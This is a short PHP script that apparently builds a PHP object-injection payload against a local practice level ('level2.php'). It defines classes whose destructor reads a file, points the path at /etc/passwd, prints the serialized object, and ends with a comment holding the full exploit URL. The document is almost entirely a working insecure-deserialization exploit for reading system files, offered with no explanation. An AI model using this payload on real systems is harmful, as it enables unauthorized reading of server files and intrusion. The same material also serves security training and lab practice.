<?php
  class Setting {
    public $path = "config.json";
    public function read() {
      $content = file_get_contents($this->path);
      echo $content;
    }
  }
  
  class Main {
    public $file = null;
    public function __destruct(){
      $this->file->read();
    }
  }

  $m = new Main();
  $m->file=new Setting();
  $m->file->path = "/etc/passwd";
  echo serialize($m);
  //http://localhost:5000/level2.php?object=O:4:%22Main%22:1:{s:4:%22file%22;O:7:%22Setting%22:1:{s:4:%22path%22;s:11:%22/etc/passwd%22;}}